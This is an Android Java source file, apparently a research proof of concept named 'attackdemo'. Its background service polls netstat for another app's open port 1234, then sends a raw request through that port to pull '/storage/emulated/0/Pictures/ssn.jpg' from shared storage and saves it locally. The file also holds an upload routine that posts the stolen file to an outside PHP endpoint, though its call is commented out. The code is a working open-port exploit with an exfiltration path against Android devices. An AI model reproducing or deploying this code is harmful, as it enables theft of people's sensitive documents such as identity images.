package com.example.chaokong.attackdemo;

import android.app.IntentService;
import android.app.Service;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.IBinder;
import android.content.Intent;
import android.os.Bundle;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.provider.SyncStateContract;
import android.renderscript.ScriptGroup;
import android.util.Base64;
import android.util.Log;


import com.android.internal.http.multipart.MultipartEntity;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.content.ContentBody;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;

public class MyService extends IntentService {

    String monitor_indicator;
    String TAG = "Monitor_app";
    private Process monitor_process = null;

    private String monitor_command = "netstat | grep \"LISTEN\"\n";
    OutputStream monitor_output;

    private SharedPreferences sp_monitor,sp1_monitor;
    private SharedPreferences.Editor spEditor_monitor;
    private String monitor_state = "FALSE";
    private String open_port_str =":1234";
    Context context;
    public static final String Local_IP_ADDRESS = "35.2.110.20";
    private int open_port_number = 1234;


    public MyService() {
        super("MyService");
    }



    @Override
    protected void onHandleIntent(Intent workIntent) {
        // Gets data from the incoming Intent
        String action = workIntent.getAction();
        context = this.getApplicationContext();

        if (action.equals("active_monitor")) {
            Bundle b = workIntent.getExtras();

            monitor_indicator = b.getString("monitor");
            Log.d(TAG,"monitor indicator:  "+monitor_indicator);

            if (monitor_indicator.equals("START"))

            {
                updateAudioState("TRUE",context);


                while (true) {


//                    monitor_state = getAudioState(context);
//                    if (monitor_state.equals("FALSE"))
//                    {
//                        break;
//                    }

                    try {


                        monitor_process = Runtime.getRuntime().exec(monitor_command);
                        BufferedReader br = new BufferedReader(new InputStreamReader(monitor_process.getInputStream()));
                        StringBuffer sb = new StringBuffer();
                        String line;
                        while ((line = br.readLine()) != null) {
                            sb.append(line).append("\n");
                        }
                        String monitor_str = sb.toString();

                        Log.d(TAG, "monitor process: " + monitor_process.toString());
                        //Log.d(TAG, "monitor string:  " + monitor_str);
                        if (monitor_str.indexOf(open_port_str) != -1)
                        {
                            Log.d(TAG,"result: open the port:  "+open_port_str);
                            try {
                                    Socket localSocket = new Socket(Local_IP_ADDRESS, open_port_number);
                                    PrintWriter pw = new PrintWriter(localSocket.getOutputStream());
                                    pw.println("GET /storage/emulated/0/Pictures/ssn.jpg  HTTP/1.1\r\n");
                                    pw.println("Host: "+Local_IP_ADDRESS+"\r\n");


                                    //pw.println("Proxy-Connection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-US\r\nX-Requested-With: mb.videoget\r\n\r\n");
                                    pw.flush();

//                                    BufferedReader br2 = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));
//                                    StringBuffer sb2 = new StringBuffer();
//                                    String line2;
//                                    while ((line2 = br2.readLine()) != null) {
//                                        sb2.append(line2);
//                                    }
//                                    String receive_str = sb2.toString();
//                                    String image_str = receive_str.split("Content-Length: 95899")[1];
//                                    Log.d(TAG,"received string: "+image_str);

                                    InputStream in = localSocket.getInputStream();
                                    OutputStream dos = new FileOutputStream("/sdcard/test.jpg");
                                    int count, offset;
                                    byte[] buffer = new byte[2048];
                                    boolean eohFound = false;
                                    while ((count = in.read(buffer)) != -1)
                                    {
                                        offset = 0;
                                        if(!eohFound){
                                            String string = new String(buffer, 0, count);
                                            int indexOfEOH = string.indexOf("\r\n\r\n");
                                            if(indexOfEOH != -1) {
                                                count = count-indexOfEOH-4;
                                                offset = indexOfEOH+4;
                                                eohFound = true;
                                            } else {
                                                count = 0;
                                            }
                                        }
                                        dos.write(buffer, offset, count);
                                        dos.flush();
                                    }
                                    in.close();
                                    dos.close();


                                    String filepath = "/sdcard/test.jpg";
                                    File imagefile = new File(filepath);
                                    FileInputStream fis = null;
                                    try {
                                        fis = new FileInputStream(imagefile);
                                    } catch (FileNotFoundException e) {
                                        // TODO Auto-generated catch block
                                        e.printStackTrace();
                                    }

                                    Bitmap bm = BitmapFactory.decodeStream(fis);


                                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                    bm.compress(Bitmap.CompressFormat.PNG, 100, stream);
                                    byte[] byteArray = stream.toByteArray();




//                                    String imgString = Base64.encodeToString(getBytesFromBitmap(bm),
//                                        Base64.NO_WRAP);



                                    //SendInformation("test");
                                    Log.d(TAG,"sent string");
                                    break;

                                }
                            catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }

                        }

                        if (monitor_process != null)
                        {
                            Log.d(TAG,"monitor process:(destroy) "+monitor_process.toString());
                            monitor_process.destroy();
                        }
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }

                    } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }

            }
            else
            {
                updateAudioState("FALSE",context);

            }

        }

        // Do work here, based on the contents of dataString
    }


    public byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
        return stream.toByteArray();
    }


    public void updateAudioState(String state,Context context){
        sp_monitor = PreferenceManager.getDefaultSharedPreferences(context);
        spEditor_monitor = sp_monitor.edit();
        spEditor_monitor.putString("monitor_state", state);
        spEditor_monitor.commit();

    }

    public String getAudioState(Context context){
        sp1_monitor = PreferenceManager.getDefaultSharedPreferences(context);
        String st =sp1_monitor.getString("monitor_state", "FALSE");
        return st;
    }



    public void SendInformation(final String test_str) {
        Thread t = new Thread() {

            public void run() {
                Looper.prepare(); // For Preparing Message Pool for the
                // child Thread
                HttpClient client = new DefaultHttpClient();
                //use your server path of php file
                HttpPost post = new HttpPost("http//141.212.110.244/upload.php");

                try{

                    File file= new File("/sdcard/test.jpg");
                FileBody bin1 = new FileBody(file);
                Log.d("Enter", "Filebody complete " + bin1);

                org.apache.http.entity.mime.MultipartEntity reqEntity = new org.apache.http.entity.mime.MultipartEntity();
                reqEntity.addPart("uploaded_file", bin1);

                post.setEntity(reqEntity);
                Log.d("Enter", "Image send complete");

                HttpResponse response = client.execute(post);

					/* Checking response */
                    if (response != null) {
                        InputStream in = response.getEntity().getContent(); // Get
                        // the
                        // data
                        // in
                        // the
                        // entity
                        String s = getStringFromInputStream(in);

                        Log.d(TAG, "Jack-Response   " +s);

                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d(TAG,"fail to send");
                }
            }
        };

        t.start();

    }




    private static String getStringFromInputStream(InputStream is) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try {

            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }


}
